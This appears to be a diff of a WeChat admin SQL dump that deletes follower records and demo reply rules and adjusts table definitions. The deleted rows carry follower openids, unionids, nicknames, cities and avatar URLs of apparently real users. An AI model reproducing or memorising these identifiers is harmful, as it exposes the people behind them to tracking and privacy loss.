-INSERT INTO `wechat_fans` VALUES (336, 'wxd0dfa10a532fe040', '', 'opVKys50bgX1EbGwzI_Ma-Vpt8ZM', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-22 15:53:37');
-INSERT INTO `wechat_fans` VALUES (337, 'wxd0dfa10a532fe040', '', 'opVKys1hfXzt8RKCzOT1xboaArGA', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-22 16:06:45');
-INSERT INTO `wechat_fans` VALUES (338, 'wxd0dfa10a532fe040', '', 'opVKys6nEEyY3hAPPmc3Seng3Pb4', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-22 16:34:37');
-INSERT INTO `wechat_fans` VALUES (339, 'wxd0dfa10a532fe040', '', 'opVKys0IC1sM4T-10yBDKWH6iIGk', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-22 19:09:36');
-INSERT INTO `wechat_fans` VALUES (340, 'wxd0dfa10a532fe040', '', 'opVKys_Y1mFqB2zFrdDkbMg9fdgU', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-22 21:29:58');
-INSERT INTO `wechat_fans` VALUES (341, 'wxd0dfa10a532fe040', '', 'opVKysysnNuwgN-dZn7gzgWIUuoY', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-22 23:01:25');
-INSERT INTO `wechat_fans` VALUES (342, 'wxd0dfa10a532fe040', '', 'opVKysyrTQ13WNP45CQx6JeW02d8', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-23 08:27:51');
-INSERT INTO `wechat_fans` VALUES (343, 'wxd0dfa10a532fe040', '', 'opVKys1A8JR4YCORa7nx7YxvOezI', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-23 08:43:02');
-INSERT INTO `wechat_fans` VALUES (344, 'wxd0dfa10a532fe040', '', 'opVKys_QR-381Mhqomnzhzr2Fll4', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-23 11:16:56');
-INSERT INTO `wechat_fans` VALUES (345, 'wxd0dfa10a532fe040', '', 'opVKys-A_R4K6DAlL3al9zXHWa74', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-23 21:00:11');
-INSERT INTO `wechat_fans` VALUES (346, 'wxd0dfa10a532fe040', '', 'opVKys8vGne261KWs2xYMaa4Zuy8', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-23 21:35:42');
-INSERT INTO `wechat_fans` VALUES (347, 'wxd0dfa10a532fe040', '', 'opVKys4PMg_bWUpDw5jIG6FGqNjs', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-23 22:43:09');
-INSERT INTO `wechat_fans` VALUES (348, 'wxd0dfa10a532fe040', '', 'opVKys4doMCGyCSGgUykJJm5cSJU', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-24 10:32:11');
-INSERT INTO `wechat_fans` VALUES (349, 'wxd0dfa10a532fe040', '', 'opVKys7Q-Th0wYOg6L8neMzHyYAw', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-24 13:20:37');
-INSERT INTO `wechat_fans` VALUES (350, 'wxd0dfa10a532fe040', '', 'opVKyswVKRHhTdxpfdJm436hOdpI', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-25 01:24:49');
-INSERT INTO `wechat_fans` VALUES (351, 'wxd0dfa10a532fe040', '', 'opVKys0MM7nGU94pxLd1lPwyEoF8', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-25 02:14:11');
-INSERT INTO `wechat_fans` VALUES (352, 'wxd0dfa10a532fe040', '', 'opVKys_5nkuMLme8DKLr0uwFlQt0', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-25 03:19:18');
-INSERT INTO `wechat_fans` VALUES (353, 'wxd0dfa10a532fe040', '', 'opVKyswXbY2TbOlMrn-P3GJqz9oI', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-25 10:34:59');
-INSERT INTO `wechat_fans` VALUES (354, 'wx60a43dd8161666d4', 'oGsrks267bVOSC66_6SFKHnq1RIA', 'o38gpswvqqnV6EuBf3aYRHvHL8eQ', ',,', 0, 1, 'ok左一茗', 1, '中国', '江苏', '苏州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFntFf6iaxS62EfFfqSQ8sbcl18iaBViclFnPG3IqOLbvY0qkeslC7WS7s6R7uwfgyeOP3HeiaZWficy6pvA9ibakaM0wb/132', 1602407271, '2020-10-11 17:07:51', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-01-25 15:31:55');
-INSERT INTO `wechat_fans` VALUES (356, 'wxd0dfa10a532fe040', '', 'opVKys9dZALyNlAICuTCEiRdu7bc', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-25 16:11:05');
-INSERT INTO `wechat_fans` VALUES (357, 'wx60a43dd8161666d4', 'oGsrksxYpv_W39UBOOoGzB_RvL2g', 'o38gps7DU8x3zJ_Gy_q1K_etTnQw', '', 0, 0, '隔三秋', 1, '中国', '澳门', '望德堂区', 'zh_CN', 'https://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83erfEUCgDKYt7aNicKP3Mt5iaTXe1q0niamibU3RWIAcDfCYonxgibZGmBcCtajJBsTjAVzDEKyP3Qrv3Kg/132', 0, NULL, '', '', '', '', '2021-01-25 16:57:17');
-INSERT INTO `wechat_fans` VALUES (358, 'wxd0dfa10a532fe040', '', 'opVKys2ilK-R7lrq5ni0yBD5-V2k', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-25 17:51:07');
-INSERT INTO `wechat_fans` VALUES (359, 'wxd0dfa10a532fe040', '', 'opVKysyVaG-QwV6sO-i6dr6bYwYA', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-25 23:52:30');
-INSERT INTO `wechat_fans` VALUES (360, 'wxd0dfa10a532fe040', '', 'opVKys-vVMrM4IJbwvTlD4aSDaRs', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-26 00:21:07');
-INSERT INTO `wechat_fans` VALUES (361, 'wxd0dfa10a532fe040', '', 'opVKys3veK0S6332DWNONhC9-iFA', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-26 10:01:50');
-INSERT INTO `wechat_fans` VALUES (362, 'wxd0dfa10a532fe040', '', 'opVKys0A6119lnOMpxFOU9w2LsBo', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-26 10:30:40');
-INSERT INTO `wechat_fans` VALUES (363, 'wxd0dfa10a532fe040', '', 'opVKys5GWc0kLZd17aPuTeff6TGg', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-26 10:37:28');
-INSERT INTO `wechat_fans` VALUES (364, 'wxd0dfa10a532fe040', '', 'opVKys-U4beI1k5p7qSDc1qLZ_JM', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-26 16:09:34');
-INSERT INTO `wechat_fans` VALUES (365, 'wxd0dfa10a532fe040', '', 'opVKys7X5YEbhKBfxMxEZcd2Ny3U', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-26 16:23:06');
-INSERT INTO `wechat_fans` VALUES (366, 'wxd0dfa10a532fe040', '', 'opVKys40qX5CZe038S-HrY3C1FBs', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-27 08:28:51');
-INSERT INTO `wechat_fans` VALUES (367, 'wxd0dfa10a532fe040', '', 'opVKys1iiZaWRVDCgtr6z49hA3e8', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-27 15:17:12');
-INSERT INTO `wechat_fans` VALUES (368, 'wxd0dfa10a532fe040', '', 'opVKys96jgFc-QwiFtDccyfoARdY', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-27 17:32:15');
-INSERT INTO `wechat_fans` VALUES (369, 'wxd0dfa10a532fe040', '', 'opVKysyOvMqJfiNCrSbIcaghKSa8', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-28 01:02:17');
-INSERT INTO `wechat_fans` VALUES (370, 'wxd0dfa10a532fe040', '', 'opVKys4iShhWdDHkBlGFKVSqUD8U', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-28 10:32:12');
-INSERT INTO `wechat_fans` VALUES (371, 'wxd0dfa10a532fe040', '', 'opVKys5gM_awCod9HIC5_Hei-efg', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-28 12:14:05');
-INSERT INTO `wechat_fans` VALUES (372, 'wxd0dfa10a532fe040', '', 'opVKys01w9j9ftenyxeGPnOOyvh8', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-28 15:13:18');
-INSERT INTO `wechat_fans` VALUES (373, 'wxd0dfa10a532fe040', '', 'opVKys9doR5Oy-Og5CmrzQMqbaA0', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-28 15:17:52');
-INSERT INTO `wechat_fans` VALUES (374, 'wxd0dfa10a532fe040', '', 'opVKys5AJ0oGv0zfWQjL_DY4jlog', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-28 17:14:07');
-INSERT INTO `wechat_fans` VALUES (375, 'wxd0dfa10a532fe040', '', 'opVKys0w-tT8w3To8iFSykED2a3c', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-28 19:17:15');
-INSERT INTO `wechat_fans` VALUES (376, 'wxd0dfa10a532fe040', '', 'opVKys-3kSft01V-lN5zfwyQWMIs', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-28 22:37:58');
-INSERT INTO `wechat_fans` VALUES (377, 'wxd0dfa10a532fe040', '', 'opVKys7_4JAdKiNfz4vhQLKiG1uY', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-29 07:18:15');
-INSERT INTO `wechat_fans` VALUES (378, 'wxd0dfa10a532fe040', '', 'opVKys6xm7Ey6SnnCStHeBah0np8', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-29 09:39:16');
-INSERT INTO `wechat_fans` VALUES (379, 'wxd0dfa10a532fe040', '', 'opVKys_iIy8YyHqGAsUAw_3HisQw', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-29 12:22:41');
-INSERT INTO `wechat_fans` VALUES (380, 'wxd0dfa10a532fe040', '', 'opVKys4x34xcSKfiO0fCUMoRX8mQ', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-29 14:57:39');
-INSERT INTO `wechat_fans` VALUES (381, 'wxd0dfa10a532fe040', '', 'opVKysxXCCQbeF2jn1j6CmqNuVVs', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-29 16:47:51');
-INSERT INTO `wechat_fans` VALUES (382, 'wxd0dfa10a532fe040', '', 'opVKys0u7NVkSUA7iDX1FR1Y5B2k', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-29 21:52:17');
-INSERT INTO `wechat_fans` VALUES (383, 'wxd0dfa10a532fe040', '', 'opVKyswnhOeH1u6wDf7VIlLrR2Kw', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-29 21:59:35');
-INSERT INTO `wechat_fans` VALUES (384, 'wxd0dfa10a532fe040', '', 'opVKys5-nmbkzLNDwg0auaG4MSAc', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-29 23:49:46');
-INSERT INTO `wechat_fans` VALUES (385, 'wxd0dfa10a532fe040', '', 'opVKys6zokn_Ucx9T820-3kLOs70', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-30 08:20:38');
-INSERT INTO `wechat_fans` VALUES (386, 'wxd0dfa10a532fe040', '', 'opVKys227Qzf-EbnbmuVG7zwwi3c', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-30 09:39:57');
-INSERT INTO `wechat_fans` VALUES (387, 'wxd0dfa10a532fe040', '', 'opVKys4kVZS49do2AOliSvWYElEA', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-30 16:00:17');
-INSERT INTO `wechat_fans` VALUES (388, 'wxd0dfa10a532fe040', '', 'opVKyszucgdDdsTuHVCxS4bUAXEA', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-30 23:30:09');
-INSERT INTO `wechat_fans` VALUES (389, 'wxd0dfa10a532fe040', '', 'opVKysxS3PHZQxxURFv4omOzAscM', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-31 09:23:57');
-INSERT INTO `wechat_fans` VALUES (390, 'wxd0dfa10a532fe040', '', 'opVKys_TGslK7FQdeUa0MKtuuWBo', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-31 13:13:05');
-INSERT INTO `wechat_fans` VALUES (391, 'wxd0dfa10a532fe040', '', 'opVKysza-8ftd2XqEVb165RMnxE0', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-01-31 20:44:01');
-INSERT INTO `wechat_fans` VALUES (392, 'wxd0dfa10a532fe040', '', 'opVKys7ruAbdfWJVFkPHQhHHhJgI', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-01 00:43:58');
-INSERT INTO `wechat_fans` VALUES (393, 'wxd0dfa10a532fe040', '', 'opVKys1vXRvI7RqzogGvotFW1wdM', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-01 05:48:08');
-INSERT INTO `wechat_fans` VALUES (394, 'wx60a43dd8161666d4', 'oGsrks1CHSXOQalGBI_-mZuOXaEU', 'o38gps_wjrbiRXm9QgYXeC0qCmFA', ',,', 0, 1, '飞翔的喵星人', 1, '爱尔兰', '奥法利', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/cXaM0LzKLKrViakFccyIgSyEGel51V3M9nbXibyCiaKEuricbllyLKTEfjDWPts71lFY0juDoaBX0Dwank0z0IeyToqOn6nVKe09/132', 1611561051, '2021-01-25 15:50:51', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-02-01 11:45:11');
-INSERT INTO `wechat_fans` VALUES (395, 'wx60a43dd8161666d4', 'oGsrksxYpFMPp5borUQ-J5tfRnIQ', 'o38gps5O6lFxrNj4t1394dBGVIoc', ',,', 0, 1, '风吹沙', 1, '中国', '陕西', '西安', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/tqRiaNianNl1mWdjxsYDFxLqb9l87UprW4Rkznq5eR7sMJDh78e6eoLaNURBn8pMyI6G5DC2Snsbh8TZxIbhlkH8Q4fM9SyERW/132', 1611283544, '2021-01-22 10:45:44', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-02-01 11:45:11');
-INSERT INTO `wechat_fans` VALUES (396, 'wx60a43dd8161666d4', 'oGsrks1VX7M8NCefpFLeUy6k3e9U', 'o38gps_uqL_-lUvUZJeQtpM_hRdQ', ',,', 0, 1, 'TTS', 1, '中国', '广东', '广州', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/wLcWG0U6YFnPniax3uBRk1dSYjP5zRY9ZBw4ePBOLkLqu5sjUkywzr9nRhHtOz4Jibo1jI83lnjWM9l9Pv7naAAG98Qg0UxZOU/132', 1608605110, '2020-12-22 10:45:10', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-02-01 11:45:11');
-INSERT INTO `wechat_fans` VALUES (397, 'wxd0dfa10a532fe040', '', 'opVKys1zWthFH_OfjV-sNrtY2Nso', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-01 12:07:10');
-INSERT INTO `wechat_fans` VALUES (398, 'wxd0dfa10a532fe040', '', 'opVKys-UafM5rEpOBG3JlSN8ylfw', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-01 17:21:58');
-INSERT INTO `wechat_fans` VALUES (399, 'wx60a43dd8161666d4', 'oGsrkszbew42TaKS9NmI3lbxx6Ec', 'o38gpsyIhRCsHO9NEf6U6l1-2u9w', '', 0, 0, '四时令', 1, '中国', '广东', '茂名', 'zh_CN', 'https://thirdwx.qlogo.cn/mmopen/vi_32/hX5F4ETx0vxxSshPPUcSibSBAe77Xz2nDGwJHXuu3NfbMAwaOvp5v8tXJMumQo3grcHV4icGicPO8upQ6Bo5zqXyQ/132', 0, NULL, '', '', '', '', '2021-02-01 18:01:35');
-INSERT INTO `wechat_fans` VALUES (400, 'wxd0dfa10a532fe040', '', 'opVKys9mYwew-vRGMxqW0C9quWC0', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-01 18:22:12');
-INSERT INTO `wechat_fans` VALUES (401, 'wxd0dfa10a532fe040', '', 'opVKys0fAkDwz4FCY2RemHHRP1ac', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-01 18:50:05');
-INSERT INTO `wechat_fans` VALUES (402, 'wxd0dfa10a532fe040', '', 'opVKys6AAyOjq8DRHP5FM6Ls8P8w', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-02 00:11:59');
-INSERT INTO `wechat_fans` VALUES (403, 'wxd0dfa10a532fe040', '', 'opVKysxOc0I7Dw9YdGCISascXH7M', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-02 09:29:47');
-INSERT INTO `wechat_fans` VALUES (404, 'wxd0dfa10a532fe040', '', 'opVKys1yBQurs2qJx-503swgtRSM', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-02 10:15:51');
-INSERT INTO `wechat_fans` VALUES (405, 'wxd0dfa10a532fe040', '', 'opVKyszEcUvnv9XTLJ2ZZtPjLgWk', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-02 10:29:31');
-INSERT INTO `wechat_fans` VALUES (406, 'wxd0dfa10a532fe040', '', 'opVKys2lNberE3qDxwznhoZDZ00w', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-02 13:59:42');
-INSERT INTO `wechat_fans` VALUES (407, 'wxd0dfa10a532fe040', '', 'opVKys2YTjuxB2wvidlgzGCoC5GU', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-02 14:41:13');
-INSERT INTO `wechat_fans` VALUES (408, 'wxd0dfa10a532fe040', '', 'opVKys2YJkUPd9wQBSy7AdNWOd9s', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-02 16:01:37');
-INSERT INTO `wechat_fans` VALUES (409, 'wxd0dfa10a532fe040', '', 'opVKys-Z5kVvzJ3ofG1VIwpziHr8', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-02 16:02:54');
-INSERT INTO `wechat_fans` VALUES (410, 'wxd0dfa10a532fe040', '', 'opVKysyRaIxi2MEXmQ1pei7h8djM', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-02 16:38:26');
-INSERT INTO `wechat_fans` VALUES (411, 'wxd0dfa10a532fe040', '', 'opVKys-vmwQB0RD9YRiS-gRoCEbg', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-03 07:51:20');
-INSERT INTO `wechat_fans` VALUES (412, 'wxd0dfa10a532fe040', '', 'opVKysx5Lrl-L6Lx6LTilknde9Ig', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-03 09:57:28');
-INSERT INTO `wechat_fans` VALUES (413, 'wxd0dfa10a532fe040', '', 'opVKys0Uye4HqIEhGLbumGLy9HrI', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-03 11:26:18');
-INSERT INTO `wechat_fans` VALUES (414, 'wxd0dfa10a532fe040', '', 'opVKys2A9aWZXdubAZO4uT2S1bDM', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-03 14:48:13');
-INSERT INTO `wechat_fans` VALUES (416, 'wxd0dfa10a532fe040', '', 'opVKys0fbjjGIBhtxZVzGIUU96O4', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-04 10:46:20');
-INSERT INTO `wechat_fans` VALUES (417, 'wxd0dfa10a532fe040', '', 'opVKys_swXtJu8A2BzWfbHrd1weU', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-04 11:48:39');
-INSERT INTO `wechat_fans` VALUES (418, 'wxd0dfa10a532fe040', '', 'opVKys-LmbPovx93_cdxLXG1a4A8', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-04 14:00:46');
-INSERT INTO `wechat_fans` VALUES (419, 'wxd0dfa10a532fe040', '', 'opVKys3YX5M2B_kQYrgtHcUbUTnA', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-04 18:45:46');
-INSERT INTO `wechat_fans` VALUES (420, 'wxd0dfa10a532fe040', '', 'opVKysyD0EMyqHGxHRo3J0pe4zUo', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-04 21:34:45');
-INSERT INTO `wechat_fans` VALUES (421, 'wxd0dfa10a532fe040', '', 'opVKys3xKtEXBTgHDozu-ceb2yWs', '', 0, 0, '', 0, '', '', '', '', '', 0, NULL, '', '', '', '', '2021-02-04 23:48:33');
-INSERT INTO `wechat_fans` VALUES (422, 'wx60a43dd8161666d4', 'oGsrks9579QivavkfkSI8q5jcdd0', 'o38gps8rtwHI3WIvBk5iOBmfDuhQ', ',,', 0, 1, 'bro💥sir', 1, '中国', '辽宁', '沈阳', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/PiajxSqBRaEL9dSef7TbwOibWDxoL241mj7tChy6UBvic6aohBoVfT6uTd3E6fa16gCaWE0ywhURjSOtPrnmOhZFg/132', 1612511253, '2021-02-05 15:47:33', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-02-05 15:47:34');
-INSERT INTO `wechat_fans` VALUES (423, 'wx60a43dd8161666d4', 'oGsrks3xIfS8x-PMsiKOFoSFZ4Jg', 'o38gps6QxLqQo5-QT7LzRVFcxyyI', '', 0, 0, '非许', 1, '安道尔', '', '', 'zh_CN', 'https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIS6al5bvVQ1WNMG5qXwGxdQlfgh7uxhakLUQSK8fFl7ggWkXxn3G9w4zKwPk7PbeYWh9kmkWowfw/132', 0, NULL, '', '', '', '', '2021-02-05 16:06:36');
-INSERT INTO `wechat_fans` VALUES (424, 'wx60a43dd8161666d4', 'oGsrks6e_1aw66FZTb4GadVjs2X4', 'o38gps05Alei9I8JQmT0t5PW3xqo', ',,', 1, 1, '宇', 1, '中国', '江苏', '南京', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/ajNVdqHZLLB3Y8iajh2gSTtjQSRZNw6k3vpyZmpXSJOw7gvhHUddOYpbXr5LNGvUCpxuiaNiaLLTAyRm8tZyd3hEIxu0GVI3GRUkAmRugOPv9E/132', 1610959133, '2021-01-18 16:38:53', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-02-10 01:36:02');
-INSERT INTO `wechat_fans` VALUES (425, 'wx60a43dd8161666d4', 'oGsrks0RlUmy19WoHF3UsAWyJT9I', 'o38gpsyN0qbuw8yd3Ev6WLDDbE3U', ',,', 1, 0, 'Watermelon🍉', 1, '日本', '', '', 'zh_CN', 'http://thirdwx.qlogo.cn/mmopen/lQEcz8ricSnhlmkw5WDLWlKpy4Gwl6M4BShW4iaq89ziaZSvGqjItADibag00wa0sUibD0Kibiax9VINArfvMk1q6HU0gzYNHibMcB1s/132', 1613628343, '2021-02-18 14:05:43', '', 'ADD_SCENE_QR_CODE', '0', '', '2021-02-18 14:05:45');
 
 -- ----------------------------
 -- Table structure for wechat_fans_tags
@@ -6425,17 +4879,11 @@ CREATE TABLE `wechat_fans_tags`  (
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建日期',
   INDEX `index_wechat_fans_tags_id`(`id`) USING BTREE,
   INDEX `index_wechat_fans_tags_appid`(`appid`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 246 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-标签' ROW_FORMAT = Compact;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-标签' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of wechat_fans_tags
 -- ----------------------------
-INSERT INTO `wechat_fans_tags` VALUES (2, 'wxa7460c47381dc523', '星标组', 0, '2021-01-19 09:01:25');
-INSERT INTO `wechat_fans_tags` VALUES (2, 'wx60a43dd8161666d4', '星标组', 37, '2021-02-24 15:16:54');
-INSERT INTO `wechat_fans_tags` VALUES (227, 'wx60a43dd8161666d4', '支付宝账号12', 4, '2021-02-24 15:16:54');
-INSERT INTO `wechat_fans_tags` VALUES (241, 'wx60a43dd8161666d4', 'administrator', 7, '2021-02-24 15:16:54');
-INSERT INTO `wechat_fans_tags` VALUES (243, 'wx60a43dd8161666d4', '仗剑天涯', 2, '2021-02-24 15:16:54');
-INSERT INTO `wechat_fans_tags` VALUES (245, 'wx60a43dd8161666d4', '测试订单', 0, '2021-02-24 15:16:54');
 
 -- ----------------------------
 -- Table structure for wechat_keys
@@ -6462,19 +4910,14 @@ CREATE TABLE `wechat_keys`  (
   `create_by` bigint(20) UNSIGNED NULL DEFAULT 0 COMMENT '创建人',
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE,
-  INDEX `index_wechat_keys_appid`(`appid`) USING BTREE,
   INDEX `index_wechat_keys_type`(`type`) USING BTREE,
-  INDEX `index_wechat_keys_keys`(`keys`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-规则' ROW_FORMAT = Compact;
+  INDEX `index_wechat_keys_keys`(`keys`) USING BTREE,
+  INDEX `index_wechat_keys_appid`(`appid`) USING BTREE
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-规则' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of wechat_keys
 -- ----------------------------
-INSERT INTO `wechat_keys` VALUES (1, '', 'news', 'default', '感谢关注1kkk', 'https://v6.thinkadmin.top/static/theme/img/image.png', '', '音乐标题', '', 'https://v6.thinkadmin.top/static/theme/img/image.png', '音乐描述', '视频标题', '', '视频描述', 8, 0, 1, 0, '2021-02-20 14:03:25');
-INSERT INTO `wechat_keys` VALUES (2, '', 'text', 'subscribe', '说点什么吧111', 'https://v6.thinkadmin.top/upload/da/32b533321d01708cc2dc5849f17178.jpg', '', '音乐标题', '', 'https://v6.thinkadmin.top/static/theme/img/image.png', '音乐描述', '视频标题', '', '视频描述', 7, 0, 1, 0, '2021-02-20 14:00:00');
-INSERT INTO `wechat_keys` VALUES (3, '', 'image', '测试', '测试', 'https://v6.thinkadmin.top/upload/c7/e22be7282d97dcd4c8b2991fc2d494.png', '', '音乐标题', '', 'https://v6.thinkadmin.top/static/theme/img/image.png', '音乐描述', '视频标题', '', '视频描述', 2, 2, 1, 0, '2021-02-05 13:28:21');
-INSERT INTO `wechat_keys` VALUES (4, '', 'news', '你好', 'ok', 'https://v6.thinkadmin.top/static/theme/img/image.png', '', '音乐标题', '', 'https://v6.thinkadmin.top/static/theme/img/image.png', '音乐描述', '视频标题', '', '视频描述', 8, 3, 1, 0, '2021-02-19 17:03:21');
-INSERT INTO `wechat_keys` VALUES (5, '', 'text', '11111', '说点什么吧', 'https://v6.thinkadmin.top/static/theme/img/image.png', '', '音乐标题', '', 'https://v6.thinkadmin.top/static/theme/img/image.png', '音乐描述', '视频标题', '', '视频描述', 0, 0, 1, 0, '2021-01-27 11:14:42');
 
 -- ----------------------------
 -- Table structure for wechat_media
@@ -6490,18 +4933,15 @@ CREATE TABLE `wechat_media`  (
   `media_url` varchar(300) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '远程图片链接',
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE,
-  INDEX `index_wechat_media_appid`(`appid`) USING BTREE,
   INDEX `index_wechat_media_md5`(`md5`) USING BTREE,
